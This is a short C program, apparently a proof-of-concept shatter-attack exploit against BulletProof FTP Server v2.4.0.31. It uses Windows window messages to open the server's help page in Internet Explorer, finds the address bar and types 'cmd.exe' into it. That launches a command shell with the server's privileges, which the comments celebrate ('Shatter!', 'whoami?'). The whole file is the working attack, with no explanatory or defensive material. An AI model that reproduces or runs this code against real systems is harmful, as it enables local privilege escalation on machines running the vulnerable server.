int main(int argc, char* argv[])
{
HWND lHandle, lHandle2;
char sText[]="%windir%\\system32\\cmd.exe";
char buffer[256];

lHandle=FindWindow(NULL, "BulletProof FTP Server v2.4.0.31");
if (!lHandle)
{
       printf("\nUsage :\nBulletProof FTP Server v2.4.0.31 doesn't seem to run?\n");
       return 0;
}
else
{
       printf("handle for BulletProof : 0x%X\n",lHandle);
}
SetForegroundWindow(lHandle);

SendMessage(lHandle, WM_IME_KEYDOWN, VK_F1, 0); //send F1 key "help me please!"
Sleep(5000);   //I need this time to drink a beer ;P

//Find the browser Handle
//lHandle2=FindWindow(NULL, "BPFTP Server - Mozilla Firefox");
//if (!lHandle2)
//{
       lHandle2=FindWindow("IEFrame", "BPFTP Server - Microsoft Internet Explorer");
       lHandle2=FindWindowEx(NULL, NULL, "IEFrame", NULL);

       printf("handle for IE : 0x%X\n",lHandle2);
       if (!lHandle2)
       {
               printf("\nError while finding the browser's window.\n");
       }
//}
//else
//{
//        printf("handle for Firefox : 0x%X\n",lHandle2);
//}
SetForegroundWindow(lHandle2);

lHandle=FindWindowEx(lHandle2, 0, "WorkerW", 0);
if (lHandle>=0)
{
       lHandle = FindWindowEx(lHandle, 0, "ReBarWindow32", 0);
       if (lHandle>=0)
       {
               //Where are you Charlie...
             lHandle = FindWindowEx(lHandle, 0, "ComboBoxEx32", 0);
             lHandle = FindWindowEx(lHandle, 0, "ComboBox", 0);
             lHandle = FindWindowEx(lHandle, 0, "Edit", 0);
       }
}
else
{
       printf("\nerror :-(\n");
}

SendMessage(lHandle, WM_SETFOCUS, 0, 0);
Sleep(300);
SendMessage(lHandle, WM_SETTEXT, 0, (LPARAM) sText);
//Shatter!
PostMessage(lHandle, WM_KEYDOWN, VK_RETURN, 0);
//whoami? :-)

return 0;
}